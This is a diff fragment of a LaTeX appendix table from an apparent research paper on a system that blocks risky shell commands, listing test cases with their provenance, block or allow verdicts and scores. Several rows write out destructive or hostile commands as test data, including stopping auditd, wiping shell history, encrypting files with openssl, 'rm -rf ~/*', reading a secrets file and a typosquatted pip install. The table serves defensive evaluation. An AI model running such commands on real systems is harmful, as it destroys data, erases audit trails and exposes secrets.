+    20 & \texttt{stop\_audit}$^{*}$ & tamper/destroy & \texttt{web} & \texttt{systemctl stop auditd} & BLOCK & $-1.11$ & \texttt{X X X} & stopped \\
+    21 & \texttt{wipe\_history} & tamper/destroy & \texttt{web} & \texttt{history -{}c;\allowbreak{} rm -{}f .\allowbreak{}.\allowbreak{}/\allowbreak{}fakehome/\allowbreak{}.\allowbreak{}bash\_history} & BLOCK & $-1.11$ & \texttt{X X X} & stopped \\
+    22 & \texttt{encrypt\_docs} & tamper/destroy & \texttt{web} & \texttt{find .\allowbreak{} -type f -name \textquotesingle{}*.\allowbreak{}txt\textquotesingle{} -exec openssl enc -aes-256-cbc -pbkdf2 -k lab -in \{\} -out \{\}.\allowbreak{}locked \textbackslash{};\allowbreak{}} & BLOCK & $-1.61$ & \texttt{X X X} & stopped \\
+    23 & \texttt{wipe\_home}$^{*}$ & tamper/destroy & \texttt{none} & \texttt{rm -{}rf \textasciitilde{}/\allowbreak{}*} & BLOCK & $-2.41$ & \texttt{. X X} & stopped \\
+    24 & \texttt{web\_rce} & server & \texttt{inbound\_request} & \texttt{id;\allowbreak{} uname -{}a} & BLOCK & $-3.11$ & \texttt{X X .} & stopped \\
+    25 & \texttt{web\_canary} & server & \texttt{inbound\_request} & \texttt{cat .\allowbreak{}.\allowbreak{}/\allowbreak{}secrets/\allowbreak{}canary-{}db.\allowbreak{}conf} & BLOCK (C) & $0.39$ & \texttt{X X X} & stopped \\
+    26 & \texttt{typosquat} & server & \texttt{download} & \texttt{pip install -{}-{}index-{}url https:/\allowbreak{}/\allowbreak{}pypi-{}mirror.\allowbreak{}example.\allowbreak{}invalid/\allowbreak{}simple reqeusts} & BLOCK & $-1.11$ & \texttt{X X X} & stopped \\
+    27 & \texttt{web\_shell} & file & \texttt{inbound\_request} & \texttt{write \textless{}web\_root\textgreater{}/\allowbreak{}uploads/\allowbreak{}cmd\_\textless{}time\textgreater{}.\allowbreak{}php  (harmless PHP stand-{}in)} & BLOCK & $-0.11$ & \texttt{X X X} & quarantined \\
+    28 & \texttt{ransom\_burst} & file & \texttt{none} & \texttt{write 60 files \textless{}workspace\textgreater{}/\allowbreak{}docs/\allowbreak{}*.\allowbreak{}locked} & BLOCK & $-2.41$ & \texttt{. X X} & detected after \\
+    29 & \texttt{hidden\_script} & known limit & \texttt{web} & \texttt{sh .\allowbreak{}.\allowbreak{}/\allowbreak{}fakehome/\allowbreak{}Downloads/\allowbreak{}update.\allowbreak{}sh} & ALLOW & $-5.11$ & \texttt{X X .} & ran \\
+    30 & \texttt{echo} & benign & \texttt{none} & \texttt{echo hello-{}tubaf} & ALLOW & $-6.91$ & \texttt{. . .} & ran \\
+    31 & \texttt{ls} & benign & \texttt{none} & \texttt{ls -{}la} & ALLOW & $-6.91$ & \texttt{. . .} & ran \\
+    32 & \texttt{python} & benign & \texttt{none} & \texttt{python3 -{}c \textquotesingle{}print(sum(range\allowbreak{}(10)))\textquotesingle{}} & ALLOW & $-6.91$ & \texttt{. . .} & ran \\
+    33 & \texttt{pasted\_echo} & benign & \texttt{web} & \texttt{echo copied-{}from-{}a-{}tu\allowbreak{}torial} & ALLOW & $-5.11$ & \texttt{X X .} & ran \\
+    34 & \texttt{pypi} & benign & \texttt{none} & \texttt{curl -{}sI -{}-{}max-{}time 3 https:/\allowbreak{}/\allowbreak{}pypi.\allowbreak{}org/\allowbreak{}simple/\allowbreak{} |\allowbreak{} head -{}1} & ALLOW & $-6.91$ & \texttt{. . .} & ran \\
+    35 & \texttt{ssh\_use\_key} & benign & \texttt{none} & \texttt{ssh -{}o BatchMode=\allowbreak{}yes -{}o ConnectTimeout=\allowbreak{}2 -{}i \textasciitilde{}/\allowbreak{}.\allowbreak{}ssh/\allowbreak{}id\_ed25519 me@\allowbreak{}login.\allowbreak{}example.\allowbreak{}invalid true} & ALLOW & $-6.91$ & \texttt{. . .} & ran \\
+    \bottomrule
+  \end{tabularx}
+\end{table*}
 
 \section{Proofs of Provenance Decay and Noisy-OR Fusion}
 \label{app:decay}
